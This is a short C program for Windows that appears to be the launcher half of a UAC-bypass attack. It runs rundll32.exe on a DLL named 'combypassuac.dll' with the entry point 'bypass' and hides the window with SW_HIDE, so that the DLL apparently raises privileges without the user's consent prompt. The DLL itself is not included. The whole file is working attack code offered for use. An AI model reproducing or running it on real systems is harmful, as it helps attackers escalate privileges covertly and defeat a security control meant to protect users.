#include <Windows.h>
#include <stdio.h>

int main(int argc, TCHAR* argv[])
{
	char szCmdLine[MAX_PATH] = { 0 };
	char szRundll32Path[MAX_PATH] = "C:\\Windows\\System32\\rundll32.exe";
	char szDllPath[MAX_PATH] = "C:\\combypassuac.dll";
	::sprintf_s(szCmdLine, "%s \"%s\" %s", szRundll32Path, szDllPath, "bypass");
	::WinExec(szCmdLine, SW_HIDE);

	printf("Run OK.\n");
	system("pause");
	return 0;
}

